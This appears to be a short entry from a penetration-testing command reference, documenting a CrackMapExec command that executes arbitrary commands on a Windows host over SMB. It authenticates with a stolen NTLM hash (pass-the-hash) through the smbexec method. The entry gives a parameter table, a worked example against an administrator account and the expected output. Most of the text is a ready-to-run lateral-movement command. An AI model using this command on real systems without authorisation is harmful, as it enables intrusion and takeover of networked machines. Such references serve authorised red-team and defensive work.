---
type: command
executor: bash
data: 'cme smb $_TARGET -u $_USER -H \":$_HASH\" --exec-method smbexec -X ''$_COMMAND'''
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - smb
  - execution
verified: true
validated: true
---

# cme-smb-exec-command

## Command

```bash
cme smb $_TARGET -u $_USER -H ":$_HASH" --exec-method smbexec -X '$_COMMAND'
```

## Description

Executes a command on target via SMBExec method.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | Target | Yes |
| -u $_USER | User | Yes |
| -H ":$_HASH" | Hash with colon prefix | Yes |
| --exec-method smbexec | Execution method | Yes |
| -X '$_COMMAND' | Command to run | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.100 -u Admin -H ":5858d47a..." --exec-method smbexec -X 'whoami'
```

## Expected Output

Command output: "example\administrator".

## Related

- [[tools/CrackMapExec]]
